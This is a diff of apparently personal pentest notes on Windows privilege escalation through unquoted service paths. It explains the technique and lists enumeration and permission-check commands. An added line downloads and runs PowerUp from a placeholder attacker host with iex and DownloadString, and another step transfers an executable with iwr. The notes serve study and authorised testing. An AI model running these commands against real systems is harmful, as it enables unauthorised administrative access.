@@ -1,4 +1,4 @@
-##################################################
+######################################################################
 # Presentation.
 
 #The UnquotedServicePath hijack is a Windows PrivEsc vector in which we leverage a malconfiguration Windows feature related to unquoted binpath strings. 
@@ -12,19 +12,36 @@
 #The system will try to execute the following executables: C:\Program.exe, C:\Program FIles\My.exe and finally C:\Program Files\My Program\My service\service.exe. So if we could store in one of those locations our malicious payload, we could have at the restart of the service, code execution through an adminstrative account resulting in a privilege escalation.
 
 ######################################################################
+#### icacls permissions mask ####
+
+# +Mask+++++++Permissions+
+#   F		       Full access
+#   M		       Modify access
+#   RX	       Read and execute access
+#   R		       Read-only access
+#   W		       Write-only access
+######################################################################
 #Enumeration.
+#List Name,State,Paths of services.
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
 
-Get-CimInstance -ClassName win32_service | Select Name,State,PathName <--- List Name,State,Paths of services.
+#Displays unquoted bin paths from services.
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """ 
 
-wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """ #<--- Displays unquoted bin paths from services."
+#Checking wether we can start/stop/restart services or not: 
+Start-Service <SERVICE_NAME>
+Restart-Service <SERVICE_NAME>
+Stop-Service <SERVICE_NAME>
 
-Start/Restart/Stop-Service
+#Check permissions of icacls.
+icacls "<BINPATH>" #Check permissions of icacls.
 
-icacls "<BINPATH>" #<--- Check permissions of icacls.
-
-iwr -uri <URI> -Outfile <PATHFILE>.exe <-- Transfer file
+#Transfer file
+iwr -uri <URI> -Outfile <PATHFILE>.exe 
 
 #PowerUp's Invoke-Allchecks cmdlet displays Unquoted Path services.
+iex (New-Object Net.WebClient).DownloadString('http://IP_ATTACKER/PowerUp.ps1')
+Invoke-AllChecks
 
 ###########################################################################
 #Leading the attack.
